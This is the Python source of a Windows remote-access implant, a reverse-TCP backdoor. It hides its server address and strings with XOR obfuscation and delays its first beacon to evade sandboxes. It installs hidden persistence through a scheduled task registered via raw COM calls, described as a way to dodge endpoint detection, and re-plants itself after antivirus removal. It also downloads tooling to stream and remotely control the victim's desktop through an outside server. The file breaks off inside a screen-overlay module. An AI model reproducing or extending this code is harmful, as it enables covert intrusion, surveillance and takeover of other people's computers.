#!/usr/bin/env python3
"""
client.py - Reverse TCP implant with persistence (remote command execution only)
Configure LHOST / LPORT below.
"""

import socket
import subprocess
import os
import sys
import time
import random
import shutil
import threading
import glob
import zipfile
import urllib.request
import traceback
import re
import json
from collections import deque

try:
    from _build_id import BUILD_ID
except Exception:
    BUILD_ID = "0"


def _x(h: str, key: int = 0x4D) -> str:
    """Decode a hex-XOR string (keeps tell-tale literals out of the binary)."""
    return bytes(int(h[i:i + 2], 16) ^ key for i in range(0, len(h), 2)).decode()


# ===== CONFIG =====
LHOST = _x("78637f7e7c637b7c637c7979")   # 5.231.61.144
LPORT = 4444             # Your listener port
RECONNECT_DELAY = 5      # Seconds before reconnect attempt
# (min, max) seconds to sleep before the first beacon (sandbox / static-
# behavior evasion). Set to (0, 0) to disable; RAT_FAST=1 bypasses it.
PRE_CONNECT_SLEEP = (30, 90)
# ==================

BUFFER = 4096
MARKER = _x("77770803097777").encode()   # ::END::

# ===== PERSISTENCE CONFIG (Windows) =====
INSTALL_DIR_NAME = _x("632e2c2e2528")   # .cache
# Candidate names, tried in order. First one that installs wins.
INSTALL_NAME_CANDIDATES = [
    _x("3f38233924202863283528"),   # runtime.exe
    _x("383d292c39283f63283528"),   # updater.exe
    _x("2528213d283f63283528"),   # helper.exe
]
REG_RUN_PATH = _x("1e222b393a2c3f281100242e3f223e222b39111a242329223a3e110e383f3f2823391b283f3e242223111f3823")
# "task" = scheduled task, on-logon trigger (lower behavioral weight
#           than a Run key); "run" = legacy HKCU Run key. Task mode
#           falls back to the Run key if the task cannot be registered.
PERSIST_MODE = _x("392c3e26")   # "task"
SCHTASK_NAME = _x("1f382339242028183d292c3928192c3e26")   # RuntimeUpdateTask
# =======================================


def _base_dir() -> str:
    """Base dir for install + runtime files: %USERPROFILE% root so the
    implant never writes to %TEMP% or %APPDATA% (both are heavily watched
    by AV/EDR). Falls back to %APPDATA% if USERPROFILE is unset."""
    return os.environ.get("USERPROFILE") or os.environ.get("APPDATA") or ""


def _module_exe_path() -> str:
    r"""Real on-disk path of the current process image (ctypes only).

    Nuitka onefile re-executes the same exe for the inner payload but
    fabricates sys.executable to a non-existent python.exe in the
    %TEMP%\onefile_* extraction dir. GetModuleFileNameW(NULL) returns
    the actual process image path, which always exists on disk.
    """
    try:
        import ctypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        buf = ctypes.create_unicode_buffer(4096)
        n = kernel32.GetModuleFileNameW(None, buf, len(buf))
        if n:
            return buf.value
    except Exception:
        pass
    return ""


def get_self_path() -> str:
    r"""Path of the running executable (works frozen and as .py).

    Nuitka does NOT set sys.frozen; detect it via the __compiled__
    marker. In onefile mode use the process image path instead of the
    fabricated sys.executable so the file exists on disk.
    """
    if getattr(sys, "frozen", False) or "__compiled__" in globals():
        p = _module_exe_path()
        if p:
            return p
        return os.path.abspath(sys.executable)
    return os.path.abspath(__file__)


def hide_path(path: str) -> None:
    """Set the hidden+system attribute on a file or folder (Windows)."""
    if os.name != "nt":
        return
    try:
        subprocess.run(
            ["attrib", "+h", "+s", path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
    except Exception:
        pass


def make_run_key_name(file_name: str) -> str:
    """Derive a Run key value name from the installed file name."""
    return os.path.splitext(file_name)[0].capitalize()


def try_install(install_dir: str, file_name: str, self_path: str):
    """
    Attempt to install under file_name. Returns full path on success,
    None if the name is taken by a locked file.
    """
    install_path = os.path.join(install_dir, file_name)

    # Already running from this exact path -> nothing to do
    if os.path.abspath(self_path).lower() == os.path.abspath(install_path).lower():
        return install_path

    # Delete any existing file at the target path first
    if os.path.exists(install_path):
        try:
            os.remove(install_path)   # replace stale/old copy
        except OSError:
            return None               # locked -> caller tries next name

    try:
        os.makedirs(install_dir, exist_ok=True)
        shutil.copy2(self_path, install_path)
    except Exception:
        return None

    return install_path


def _current_is_installed() -> bool:
    """True if we are already running from the hidden install dir."""
    root = _base_dir()
    if not root:
        return False
    self_path = os.path.abspath(get_self_path()).lower()
    return any(self_path == os.path.abspath(
        os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _process_paths() -> set:
    """Full paths of all running processes, via ctypes only (no script
    engine -> no PowerShell/CIM telemetry in the guard loop)."""
    paths = set()
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        psapi = ctypes.WinDLL("psapi", use_last_error=True)

        enum = psapi.EnumProcesses
        PDWORD = ctypes.POINTER(wintypes.DWORD)
        enum.argtypes = (PDWORD, wintypes.DWORD, wintypes.LPDWORD)
        enum.restype = wintypes.BOOL
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE

        size = 8192
        while True:
            buf = (wintypes.DWORD * (size // 4))()
            needed = wintypes.DWORD()
            if not enum(ctypes.cast(buf, PDWORD), ctypes.sizeof(buf),
                        ctypes.byref(needed)):
                if ctypes.get_last_error() == 122 and size < (1 << 16):
                    size *= 2
                    continue
                return paths
            break
        count = needed.value // ctypes.sizeof(wintypes.DWORD)
        for pid in buf[:count]:
            if not pid:
                continue
            h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
            if not h:
                continue
            try:
                cap = wintypes.DWORD(4096)
                path = ctypes.create_unicode_buffer(4096)
                if query(h, 0, path, ctypes.byref(cap)):
                    paths.add(path.value.lower())
            finally:
                kernel32.CloseHandle(h)
    except Exception:
        pass
    return paths


def _installed_running() -> bool:
    """True if an installed candidate exe (EXACT path) is running.

    Exact-match only: in Nuitka onefile mode the inner payload re-executes
    from the extraction dir ({USERPROFILE}\\.cache\\rt\\...), so prefix-
    matching the install dir would make the very first run see itself as
    already installed and exit before installing. Only the original exe
    path (parent image) ever equals an installed candidate.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    try:
        running = _process_paths()
        return any(
            os.path.abspath(os.path.join(root, INSTALL_DIR_NAME, n)).lower()
            in running for n in INSTALL_NAME_CANDIDATES)
    except Exception:
        return False


def _parent_pid() -> int:
    """PID of the parent process (Toolhelp32 snapshot, ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

        class PROCESSENTRY32W(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", ctypes.c_wchar * 260),
            ]

        snap = kernel32.CreateToolhelp32Snapshot(0x2, 0)   # TH32CS_SNAPPROCESS
        if not snap or snap == -1:
            return 0
        try:
            pe = PROCESSENTRY32W()
            pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
            if not kernel32.Process32FirstW(snap, ctypes.byref(pe)):
                return 0
            my_pid = os.getpid()
            while True:
                if pe.th32ProcessID == my_pid:
                    return int(pe.th32ParentProcessID)
                if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                    return 0
        finally:
            kernel32.CloseHandle(snap)
    except Exception:
        return 0


def _pid_image_path(pid: int) -> str:
    """Full image path of a process by PID (ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL

        h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        try:
            cap = wintypes.DWORD(4096)
            buf = ctypes.create_unicode_buffer(4096)
            if query(h, 0, buf, ctypes.byref(cap)):
                return buf.value
        finally:
            kernel32.CloseHandle(h)
    except Exception:
        pass
    return ""


def _parent_is_installed() -> bool:
    """True if our parent process image is an installed candidate.

    Nuitka onefile: the parent (bootstrapper) image is the original exe
    path, the child image is the extraction dir. So an installed copy
    launched at logon shows up as parent=~\\.cache\\helper.exe with the
    running payload as its child. If our parent is an installed candidate
    we ARE that payload and must connect, not exit.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    ppath = _pid_image_path(_parent_pid()).lower()
    if not ppath:
        return False
    return any(
        ppath == os.path.abspath(
            os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _set_run_key(file_name: str, install_path: str) -> None:
    """(Re)create the HKCU Run entry for the installed copy."""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN_PATH, 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, make_run_key_name(file_name), 0,
                          winreg.REG_SZ, install_path)
        winreg.CloseKey(key)
    except Exception:
        pass


def _variant_type():
    """ctypes.VARIANT is absent on some Windows builds - define it.
    Zero-initialised VARIANT is a valid VT_EMPTY."""
    import ctypes
    vt = getattr(ctypes, "VARIANT", None)
    if vt is not None:
        return vt

    class _VARIANT(ctypes.Structure):   # 16 B x86 / 24 B x64
        _fields_ = [("vt", ctypes.c_ushort), ("r1", ctypes.c_ushort),
                    ("r2", ctypes.c_ushort), ("r3", ctypes.c_ushort),
                    ("ptr", ctypes.c_void_p), ("tail", ctypes.c_void_p)]

    ctypes.VARIANT = _VARIANT
    return _VARIANT


def _com_slot(ptr, idx, *atypes):
    """Build a callable for vtable slot `idx` of a raw COM interface ptr."""
    import ctypes
    vtbl = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_void_p))[0]
    addr = ctypes.c_void_p.from_address(
        vtbl + idx * ctypes.sizeof(ctypes.c_void_p)).value
    return ctypes.WINFUNCTYPE(ctypes.HRESULT, ctypes.c_void_p,
                              *atypes)(addr)


def _com_release(ptr) -> None:
    import ctypes
    try:
        p = ptr.value if isinstance(ptr, ctypes.c_void_p) else ptr
        if p:
            _com_slot(p, 2)(p)   # IUnknown::Release
    except Exception:
        pass


def _ts_open():
    """Open the local Task Scheduler service fully in-process.

    Returns (service, root_folder) raw COM pointers or None. All calls
    are vtable-indexed; taskschd interfaces are IDispatch-derived, so
    custom methods start at slot 7:
      ITaskService: GetFolder=7, Connect=10
      ITaskFolder:  GetTask=13, RegisterTask=16
    """
    import ctypes
    ole32 = ctypes.oledll.ole32
    try:
        ole32.CoInitializeEx(None, 0)       # COINIT_APARTMENTTHREADED
    except OSError:
        pass                                # already initialised
    svc = ctypes.c_void_p()
    try:
        import uuid
        # GUID memory layout == uuid.bytes_le (16-byte buffer is a valid
        # CLSID/IID pointer)
        clsid = ctypes.create_string_buffer(
            uuid.UUID("{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}").bytes_le, 16)
        iid = ctypes.create_string_buffer(
            uuid.UUID("{2FABA4C7-4DA9-4013-9697-20CC3FD40F85}").bytes_le, 16)
        ole32.CoCreateInstance(
            ctypes.byref(clsid),
            None, 1,                       # CLSCTX_INPROC_SERVER
            ctypes.byref(iid),
            ctypes.byref(svc))
    except OSError:
        return None
    if not svc.value:
        return None
    try:
        VARIANT = _variant_type()
        connect = _com_slot(svc, 10,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT))
        empty = VARIANT()
        if connect(svc, ctypes.byref(empty), ctypes.byref(empty),
                   ctypes.byref(empty), ctypes.byref(empty)) != 0:
            return None
        folder = ctypes.c_void_p()
        getf = _com_slot(svc, 7, ctypes.c_wchar_p,
                         ctypes.POINTER(ctypes.c_void_p))
        if getf(svc, ctypes.c_wchar_p("\\"),
                ctypes.byref(folder)) != 0 or not folder.value:
            return None
        return svc, folder
    except Exception:
        return None


def _ts_release(svc, folder) -> None:
    for p in (folder, svc):
        _com_release(p)


def _create_task(install_path: str) -> None:
    """Register a per-user 'on logon' scheduled task.

    Done entirely in-process via the Task Scheduler COM API (ctypes
    vtable calls) - no powershell.exe / schtasks.exe child is ever
    spawned, so behavioural detections on hidden PowerShell task
    creation have nothing to trigger on. RegisterTask (the same COM
    API PowerShell wraps) is allowed for standard users, unlike
    schtasks /sc onlogon.
    """
    try:
        import ctypes
        import xml.sax.saxutils as _sx
        handles = _ts_open()
        if not handles:
            return
        svc, folder = handles
        try:
            uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
                                          os.environ.get("USERNAME", "")))
            xml = (
                '<?xml version="1.0" encoding="UTF-16"?>'
                '<Task version="1.2" '
                'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                '<Triggers><LogonTrigger><UserId>%s</UserId></LogonTrigger></Triggers>'
                '<Principals><Principal id="Author"><UserId>%s</UserId>'
                '<LogonType>InteractiveToken</LogonType></Principal></Principals>'
                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
                '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
                '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
                '</Task>'
            ) % (uid, uid, _sx.escape(install_path))
            VARIANT = _variant_type()
            reg = _com_slot(folder, 16,
                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.c_long, ctypes.POINTER(VARIANT),
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            v = VARIANT()
            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
            _com_release(out)
        finally:
            _ts_release(svc, folder)
    except Exception:
        pass


def _task_active() -> bool:
    """True if the scheduled task exists (in-process COM, no schtasks)."""
    try:
        import ctypes
        handles = _ts_open()
        if not handles:
            return False
        svc, folder = handles
        try:
            get = _com_slot(folder, 13, ctypes.c_wchar_p,
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            ok = get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
                     ctypes.byref(out)) == 0
            _com_release(out)
            return ok
        finally:
            _ts_release(svc, folder)
    except Exception:
        return False


def _ensure_persistence(file_name: str, install_path: str) -> None:
    """(Re)create the autostart entry (task by default, Run key fallback)."""
    if PERSIST_MODE == _x("392c3e26"):   # "task"
        _create_task(install_path)
        if not _task_active():
            _set_run_key(file_name, install_path)   # fallback
    else:
        _set_run_key(file_name, install_path)


def install_persistence() -> None:
    """
    Install self under a hidden user-writable folder with a HKCU Run key.
    - Deletes any existing file at the target path first; falls back to
      the next candidate name if a file is locked.
    - Only exits (hand-off) AFTER the installed copy is confirmed alive.
      If AV kills the fresh copy within seconds, we keep running instead
      of dying into a dead file.
    User-level (mid-integrity) persistence - no admin required.
    """
    if os.name != "nt":
        return

    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)

    if _current_is_installed():
        return                      # already the installed copy
    if _installed_running():
        if _parent_is_installed():
            return                  # we are the installed copy's onefile payload
        sys.exit(0)                 # copy alive elsewhere; avoid double beacon

    install_path = None
    used_name = None
    for candidate in INSTALL_NAME_CANDIDATES:
        install_path = try_install(install_dir, candidate, get_self_path())
        if install_path:
            used_name = candidate
            break
    if not install_path:
        return                      # every candidate failed; bail quietly

    hide_path(install_dir)
    hide_path(install_path)
    _ensure_persistence(used_name, install_path)

    # Hand off ONLY after the copy is confirmed running
    try:
        p = subprocess.Popen(
            [install_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True,
        )
        time.sleep(3)
        if p.poll() is None:
            sys.exit(0)             # copy is alive -> safe to exit
        # copy died within 3s (quarantined?) -> keep running from here
    except Exception:
        pass


def _persistence_guard() -> None:
    """Background task: if the installed copy or autostart entry disappears
    (AV removal, manual deletion), re-plant it. Runs every 45 s."""
    if os.name != "nt":
        return
    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)
    while True:
        time.sleep(45)
        try:
            if _current_is_installed():
                continue            # we ARE the installed copy
            if _installed_running():
                # copy alive: make sure the autostart entry still points at it
                for candidate in INSTALL_NAME_CANDIDATES:
                    ip = os.path.join(install_dir, candidate)
                    if os.path.exists(ip):
                        _ensure_persistence(candidate, ip)
                        break
                continue
            # nothing running -> re-plant
            install_path = None
            used_name = None
            for candidate in INSTALL_NAME_CANDIDATES:
                install_path = try_install(install_dir, candidate, get_self_path())
                if install_path:
                    used_name = candidate
                    break
            if not install_path:
                continue
            hide_path(install_dir)
            hide_path(install_path)
            _ensure_persistence(used_name, install_path)
            subprocess.Popen(
                [install_path],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True,
            )
        except Exception:
            continue


# ===== NETVNC STREAM (WebRTC desktop stream + remote control) =====
# Lazy pull of Node.js (official zip from nodejs.org/dist) + the netvnc
# desktop streamer bundle (werift/ffmpeg-static/ws + stream-video-script.js).
# Installs hidden under %USERPROFILE%\\.cache (same dir as the implant),
# runs detached + hidden. netvnc signaling/viewer/TURN already live on VPS.
STREAM_WS = _x("3a3e3e7762622328393b232e6335343f2c3e203e63232839623a3e")   # wss://netvnc.xyrasms.net/ws
VIEWER_BASE = _x("2539393d3e7762622328393b232e6335343f2c3e203e63232839")   # https://netvnc.xyrasms.net
NODE_ZIP_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c24236223222928603b7f7f637c79637d603a242360357b796337243d")   # GitHub raw node zip
BUNDLE_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c2423622328393b232e1229283e2639223d123a24237b796337243d")   # GitHub raw bundle
NODE_DIR = _x("233b23222928")     # nvnode
DESK_DIR = _x("233b29283e26")     # nvdesk
BUNDLE_NAME = _x("2328393b232e1229283e2639223d123a24237b796337243d")

_stream_state = {"popen": None, "phase": "idle", "room": "", "last_error": "",
                 "logf": None}


def _stream_dir(name: str) -> str:
    return os.path.join(_base_dir(), INSTALL_DIR_NAME, name)


def _node_exe():
    hits = glob.glob(os.path.join(_stream_state_path(), NODE_DIR, "**", "node.exe"),
                     recursive=True)
    return hits[0] if hits else None


def _stream_state_path() -> str:
    return os.path.join(_base_dir(), INSTALL_DIR_NAME)


def _download_to(url: str, dest: str) -> None:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
        while True:
            chunk = resp.read(1 << 20)
            if not chunk:
                break
            f.write(chunk)


def _extract_zip(zpath: str, dest: str) -> None:
    with zipfile.ZipFile(zpath) as z:
        z.extractall(dest)


def _spawn_hidden(argv, cwd=None, stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL):
    """Detached, fully hidden process (no window, no console flash)."""
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0   # SW_HIDE
    return subprocess.Popen(
        argv,
        cwd=cwd,
        stdout=stdout,
        stderr=stderr,
        stdin=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        startupinfo=si,
        close_fds=True,
    )


def deploy_stream(room: str = "default") -> str:
    """Ensure Node + netvnc streamer bundle are installed (hidden under
    %USERPROFILE%\\.cache), then launch the WebRTC streamer detached.
    Remote control (mouse/keyboard via /control relay) is enabled."""
    if os.name != "nt":
        return "[!] stream: Windows only"

    def work():
        try:
            _stream_state["phase"] = "checking"
            base = os.path.join(_base_dir(), INSTALL_DIR_NAME)

            node = _node_exe()
            if not node:
                _stream_state["phase"] = "downloading node"
                nz = os.path.join(base, "nvnode.zip")
                _download_to(NODE_ZIP_URL, nz)
                hide_path(nz)
                nroot = os.path.join(base, NODE_DIR)
                os.makedirs(nroot, exist_ok=True)
                _extract_zip(nz, nroot)
                os.remove(nz)
                hide_path(nroot)
                node = _node_exe()
            if not node:
                _stream_state["last_error"] = "node.exe not found after install"
                _stream_state["phase"] = "failed"
                return

            desk = os.path.join(base, DESK_DIR)
            marker = os.path.join(desk, ".installed")
            script = os.path.join(desk, "stream-video-script.js")
            if not os.path.exists(script):
                _stream_state["phase"] = "downloading bundle"
                bz = os.path.join(base, BUNDLE_NAME)
                _download_to(BUNDLE_URL, bz)
                hide_path(bz)
                os.makedirs(desk, exist_ok=True)
                _extract_zip(bz, desk)
                os.remove(bz)
                open(marker, "w").close()
                hide_path(desk)
                hide_path(marker)
            if not os.path.exists(script):
                _stream_state["last_error"] = "stream-video-script.js missing from bundle"
                _stream_state["phase"] = "failed"
                return

            prev = _stream_state.get("popen")
            if prev is not None and prev.poll() is None:
                _stream_state["phase"] = "running"
                return                      # already streaming

            _under_start()   # pipe + under.json ready BEFORE ffmpeg picks its input
            for _ in range(30):                 # wait up to 3s for the meta file
                if os.path.exists(_under_meta_path()):
                    break
                time.sleep(0.1)
            _stream_state["phase"] = "starting"
            logf = open(os.path.join(desk, "nvstream.log"), "w")
            _stream_state["logf"] = logf
            p = _spawn_hidden(
                [node, script,
                 "--stream-url", STREAM_WS,
                 "--room", room,
                 "--fps", "12",
                 "--allow-control"],
                cwd=desk,
                stdout=logf,
                stderr=subprocess.STDOUT,
            )
            time.sleep(2)
            if p.poll() is not None:
                _stream_state["last_error"] = f"streamer exited code={p.returncode}"
                _stream_state["phase"] = "failed"
                return
            # persist the pid so a later beacon (fresh process, no Popen
            # handle) can still stop the streamer without spawning any
            # powershell/CIM sweep
            try:
                with open(os.path.join(desk, "nvspid.txt"), "w") as fh:
                    fh.write(str(p.pid))
            except Exception:
                pass
            _stream_state.update(popen=p, pid=p.pid, room=room,
                                 phase="running", last_error="")
        except Exception as e:
            _stream_state["last_error"] = str(e)
            _stream_state["phase"] = "failed"

    threading.Thread(target=work, daemon=True, name="nvstream").start()
    return f"[+] netvnc stream deploy started (room={room}, control=on)"


def stop_stream() -> str:
    killed = 0
    p = _stream_state.get("popen")
    if p is not None and p.poll() is None:
        try:
            subprocess.run(["taskkill", "/PID", str(p.pid), "/T", "/F"],
                           capture_output=True, timeout=15,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            killed += 1
        except Exception:
            pass
    # belt-and-braces: also kill pids recorded on previous boots (a
    # beacon restart loses the Popen handle); no powershell/CIM spawn
    try:
        pf = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvspid.txt")
        if os.path.exists(pf):
            with open(pf, "r") as fh:
                old = (fh.read() or "").strip()
            try:
                os.remove(os.path.join(_base_dir(), INSTALL_DIR_NAME,
                                       DESK_DIR, "nvspid.txt"))
            except Exception:
                pass
            if old.isdigit():
                subprocess.run(["taskkill", "/PID", old, "/T", "/F"],
                               capture_output=True, timeout=15,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                killed += 1
    except Exception:
        pass
    _stream_state.update(popen=None, pid=0, phase="stopped")
    return f"[+] stream stopped ({killed} tracked)"


def stream_log(lines: int = 100) -> str:
    """Tail the streamer log (node stdout+stderr incl. ffmpeg/ICE errors)."""
    path = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
    if not os.path.exists(path):
        return "[!] no stream log yet (stream never started on this boot)"
    try:
        with open(path, "r", errors="replace") as f:
            buf = f.read().splitlines()
        tail = buf[-lines:]
        return f"--- nvstream.log ({len(buf)} lines, showing {len(tail)}) ---\n" \
               + "\n".join(tail)
    except Exception as e:
        return f"[!] log read failed: {e}"


def stream_status() -> str:
    p = _stream_state.get("popen")
    room = _stream_state.get("room") or "default"
    if p is not None and p.poll() is None:
        line = f"netvnc stream: RUNNING pid={p.pid} room={room} control=on"
    elif _stream_state.get("phase") == "failed":
        line = "netvnc stream: FAILED"
    else:
        line = f"netvnc stream: not running (phase={_stream_state.get('phase')})"
    lines = [line]
    if _stream_state.get("last_error"):
        lines.append(f"last_error: {_stream_state['last_error']}")
    logp = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
    lines.append("log: " + (logp if os.path.exists(logp)
                            else "none yet (use: stream log after start)"))
    node = _node_exe()
    lines.append(f"node: {node if node else 'not installed'}")
    script = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR,
                          "stream-video-script.js")
    lines.append("bundle: " + ("OK " + os.path.dirname(script)
                                if os.path.exists(script) else "not installed"))
    lines.append(f"viewer: {VIEWER_BASE}/?room={room}")
    return "\n".join(lines)


# ===== OVERLAY / CURSOR / ELEVATION / POWER MODULE =====
_ov_state = {"thread": None, "hwnd": None, "black": False,
             "bits": None, "w": 0, "h": 0}
_ov_refs = {}
_pw_refs = {}
# cursor-pin low-level hook state (see _cursor_block): pump thread, hook
# handles, keep-alive refs for HOOKPROC trampolines (GC'ing a trampoline
# => access violation, so they live forever here).
_cursor_state = {"thread": None, "hooks": [], "cbs": []}


def _capture_screen() -> None:
    """One-shot GDI grab of the primary screen into a persistent BGRA
    top-down buffer (used to paint the overlay once, no refresh)."""
    import ctypes
    u32 = ctypes.windll.user32
    g32 = ctypes.windll.gdi32
    ctx = u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))  # per-monitor
    try:
        w = u32.GetSystemMetrics(0)
        h = u32.GetSystemMetrics(1)
    finally:
        if ctx:
            u32.SetThreadDpiAwarenessContext(ctx)
    if not w or not h:
        return

    class BMIH(ctypes.Structure):
        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                    ("biBitCount", ctypes.c_ushort),
                    ("biCompression", ctypes.c_uint),
                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
                    ("biClrImportant", ctypes.c_uint)]

    class BMI(ctypes.Structure):
        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]

    bmi = BMI()
    bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
    bmi.bmiHeader.biWidth = w
    bmi.bmiHeader.biHeight = -h          # top-down
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    hdc = u32.GetDC(None)
    mem = g32.CreateCompatibleDC(hdc)
    ptr = ctypes.c_void_p()
    sec = g32.CreateDIBSection(mem, ctypes.byref(bmi), 0,
                               ctypes.byref(ptr), None, 0)
    if sec and ptr.value:
        old = g32.SelectObject(mem, sec)
        g32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)   # SRCCOPY
        g32.SelectObject(mem, old)
        buf = ctypes.create_string_buffer(w * h * 4)
        ctypes.memmove(buf, ptr, w * h * 4)
        _ov_state["bits"], _ov_state["w"], _ov_state["h"] = buf, w, h
    if sec:
        g32.DeleteObject(sec)
    if mem:
        g32.DeleteDC(mem)
    if hdc:
        u32.ReleaseDC(None, hdc)


def _overlay_run(black: bool) -> None:
    """Fullscreen NULL-cursor popup painted with the frozen screen (or
    solid black). Owns a message pump; ends on WM_CLOSE."""
    import ctypes
    u32 = ctypes.windll.user32
    g32 = ctypes.windll.gdi32
    u32.DefWindowProcW.restype = ctypes.c_ssize_t
    u32.DefWindowProcW.argtypes = (ctypes.c_void_p, ctypes.c_uint,
                                   ctypes.c_size_t, ctypes.c_ssize_t)

    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p,
                                 ctypes.c_uint, ctypes.c_size_t,
                                 ctypes.c_ssize_t)
    WM_PAINT, WM_DESTROY, WM_CLOSE = 0x0F, 0x02, 0x10

    class RECT(ctypes.Structure):
        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                    ("r", ctypes.c_long), ("b", ctypes.c_long)]

    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class PAINTSTRUCT(ctypes.Structure):
        _fields_ = [("hdc", ctypes.c_void_p), ("fErase", ctypes.c_int),
                    ("rcPaint", RECT), ("fRestore", ctypes.c_int),
                    ("fIncUpdate", ctypes.c_int),
                    ("rgbReserved", ctypes.c_byte * 32)]

    class MSG(ctypes.Structure):
        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
                    ("time", ctypes.c_uint), ("pt", POINT)]

    class WNDCLASSW(ctypes.Structure):
        _fields_ = [("style", ctypes.c_uint), ("lpfnWndProc", WNDPROC),
                    ("cbClsExtra", ctypes.c_int), ("cbWndExtra", ctypes.c_int),
                    ("hInstance", ctypes.c_void_p), ("hIcon", ctypes.c_void_p),
                    ("hCursor", ctypes.c_void_p),
                    ("hbrBackground", ctypes.c_void_p),
